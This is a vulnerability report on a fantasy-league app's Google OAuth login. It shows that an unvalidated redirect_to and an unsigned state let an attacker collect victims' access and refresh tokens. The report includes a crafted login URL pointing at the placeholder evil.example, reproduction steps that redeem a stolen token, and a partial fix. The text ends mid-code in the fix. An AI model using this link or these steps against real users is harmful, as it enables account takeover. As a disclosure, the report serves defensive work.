# Google OAuth flow lets attackers choose the post-login redirect and receive the victim's JWTs

## Summary

`apps/accounts/views.py:22` reads `redirect_to` straight from the query string, embeds it in the OAuth `state` blob (line 30), and the callback (lines 64–73) parses that state back out **without validating the host and without verifying the state's integrity**. The success redirect at line 120 then appends `tokens={access,refresh}` and the full `user` object to that unvalidated URL. Any link of the form

```
https://fantasykenya.com/api/v1/auth/google/login/?redirect_to=https://evil.example
```

turns the app into a token dispenser: the victim completes a perfectly ordinary-looking Google consent screen for the real app, and the backend 302s their brand-new `access` and `refresh` JWTs (valid 1 day / 7 days per `SIMPLE_JWT` in `config/settings/base.py:209-219`) to the attacker's server. Even the *legitimate* flow leaks the same tokens into query strings — browser history, and nginx access logs (`$request` logs the full URI by default in `docker/production/nginx/nginx.conf`).

## Environment

- Repo: `Morvin-Ian/kenyan-fantasy-league`
- Source: manual (code inspection)
- Affected endpoints: `GET /api/v1/auth/google/login/`, `GET /api/v1/auth/google/callback/` (`apps/accounts/urls.py:10-15`)
- Entry points that send users into the flow: `client/src/views/Auth/SignIn.vue:142-144` and `SignUp.vue:285-287` (`window.location.href = "/api/v1/auth/google/login/"`)

## What happened

Tracing the flow end-to-end:

| Step | Location | Behavior |
|---|---|---|
| 1 | `views.py:22` | `redirect_to = request.GET.get("redirect_to", settings.FRONTEND_URL)` — arbitrary value accepted |
| 2 | `views.py:29-34` | `{"redirect_to": f"{redirect_to}/auth/callback", "origin": ..., "timestamp": ...}` serialized to JSON and used as OAuth `state` |
| 3 | `views.py:44` | Unsigned `state` sent to Google and echoed back verbatim |
| 4 | `views.py:64-73` | Callback `json.loads(state)` and adopts `redirect_to` with no scheme/host check |
| 5 | `views.py:102-105` | Backend exchanges the code, gets/creates the user, mints fresh SimpleJWT pair |
| 6 | `views.py:109-125` | `success_url = f"{redirect_to}?auth_success=true&tokens={encoded_tokens}&user={encoded_user}&..."` → `redirect(success_url)` |

Nothing between steps 1 and 6 constrains where `redirect_to` may point. The `timestamp` field in the state is written but never checked, and the state itself carries no signature, so it can also be forged wholesale.

## Root cause

1. **Unvalidated redirect target.** `redirect_to` is treated as trusted input even though it originates from the URL of a GET endpoint that any third party can link to. There is no allowlist comparison against `settings.FRONTEND_URL` (or the domains nginx serves, `docker/production/nginx/nginx.conf:8,24`).
2. **Unsigned, unbound `state`.** OAuth `state` exists precisely to carry tamper-proof context and bind the callback to the initiator. Here it is plain JSON: anyone can construct a state (or omit one — the callback falls back to defaults), and there is no per-session nonce, so the flow is also open to login-CSRF/replay of an attacker's own `code`.
3. **Secrets in the query string.** Even without an attacker, step 6 publishes long-lived credentials in a URL — captured by browser history, `Referer` headers on the landing page, and any intermediary logging `$request`.

## Impact

- **Full account takeover:** an attacker who gets a victim to click the crafted login link receives the victim's `access` (24 h) and `refresh` (7 days) tokens plus their `user` object (id, email, username) — no password, no interaction beyond one click and the standard Google consent screen for the real application.
- **Login CSRF:** because state is not bound to the victim's browser session, an attacker can complete the flow with *their own* code and have the victim silently logged into the attacker's account.
- **Passive credential leakage** on the happy path via logs/history/Referer, independent of any attack.

## How to reproduce

1. Host anything at `https://evil.example` that logs query strings.
2. Send a victim to `https://<prod-host>/api/v1/auth/google/login/?redirect_to=https://evil.example`.
3. Victim signs in with Google as usual.
4. Observe `GET /auth/callback?auth_success=true&tokens={"access":"…","refresh":"…"}&user={…}` hitting `evil.example`; redeem the refresh token against `/api/v1/auth/jwt/refresh/` as the victim.

## Suggested fix

Three changes in `apps/accounts/views.py`, none of which break the existing Vue routes:

1. **Allowlist the redirect target before it enters state** (init view):

   ```python
   from urllib.parse import urlparse

   def _safe_redirect_target(candidate: str) -> str:
       allowed = {urlparse(settings.FRONTEND_URL).netloc}
       return candidate if urlparse(candidate).netloc in allowed else settings.FRONTEND_URL

   redirect_to = _safe_redirect_target(request.GET.get("redirect_to", settings.FRONTEND_URL))
   ```

2. **Sign the state and verify it in the callback**, so a forged/tampered state can never steer the redirect:

   ```python
   from django.core import signing
   state = signing.dumps(state_data)                    # init
   state_data = signing.loads(state,
